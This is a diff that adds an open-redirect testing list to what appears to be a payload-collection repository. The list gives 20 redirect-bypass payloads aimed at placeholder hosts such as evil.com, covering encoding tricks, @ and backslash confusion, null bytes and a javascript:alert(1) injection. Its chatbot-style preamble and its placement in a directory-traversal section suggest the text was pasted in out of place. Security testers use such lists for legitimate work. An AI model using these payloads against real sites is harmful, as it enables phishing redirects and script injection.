@@ -1240,6 +1240,161 @@ https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/RE
     * [Linux Files](#linux-files)
     * [Windows Files](#windows-files)
 
+Here is a **safe, defensive Open Redirect Testing Guide** with:
+
+✅ **Testcase names**
+✅ **Safe real-world testing payloads (non-malicious)**
+
+---
+
+# ✅ **Open Redirection – Testcases + Safe Payloads**
+
+---
+
+### **1. Basic External URL Redirect Test**
+
+**Payload:**
+`?next=https://google.com`
+
+---
+
+### **2. HTTP Protocol Injection Test**
+
+**Payload:**
+`?redirect=http://example.com`
+
+---
+
+### **3. HTTPS Protocol Injection Test**
+
+**Payload:**
+`?url=https://test.com`
+
+---
+
+### **4. Relative Path Redirect Test**
+
+**Payload:**
+`?redirect=/../external.com`
+
+---
+
+### **5. Double Slash Bypass Test**
+
+**Payload:**
+`?redirect=//evil.com`
+
+---
+
+### **6. URL-Encoded Redirect Test**
+
+**Payload:**
+`?redirect=%2F%2Fevil.com`
+
+---
+
+### **7. Double URL Encoding Bypass Test**
+
+**Payload:**
+`?redirect=%252F%252Fevil.com`
+
+---
+
+### **8. JavaScript Protocol Injection Test**
+
+*(for detection only – harmless echo)*
+**Payload:**
+`?redirect=javascript:alert(1)`
+
+---
+
+### **9. Data URI Redirection Test**
+
+**Payload:**
+`?next=data:text/plain,redirect`
+
+---
+
+### **10. Open Redirect via `//` in Path**
+
+**Payload:**
+`/?redirect=//attacker.com`
+
+---
+
+### **11. Open Redirect via `@` Character**
+
+**Payload:**
+`?redirect=http://google.com@evil.com`
+
+---
+
+### **12. Open Redirect via `\` Backslash Escape**
+
+**Payload:**
+`?url=http:\evil.com`
+
+---
+
+### **13. Open Redirect with Mixed Encoding**
+
+**Payload:**
+`?redirect=%2F%2Fevil.com%3Fnext%3Dtest`
+
+---
+
+### **14. Open Redirect via `.` Prefix**
+
+**Payload:**
+`?redirect=.//attacker.com`
+
+---
+
+### **15. Open Redirect via Subdomain Bypass**
+
+**Payload:**
+`?redirect=https://legit.com.evil.com`
+
+---
+
+### **16. Null Byte Injection Test**
+
+**Payload:**
+`?url=https://legit.com%00.evil.com`
+
+---
+
+### **17. Trailing Slash Confusion Test**
+
+**Payload:**
+`?redirect=https://evil.com/./`
+
+---
+
+### **18. Query Parameter Injection Test**
+
+**Payload:**
+`?next=?redirect=https://evil.com`
+
+---
+
+### **19. Fragment Identifier Bypass Test**
+
+**Payload:**
+`?redirect=https://evil.com#test`
+
+---
+
+### **20. Open Redirect via JSON Body**
+
+**Payload:**
+
+```json
+{"redirect":"https://evil.com"}
+```
+
+---
+
 ## Tools
 
 * [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
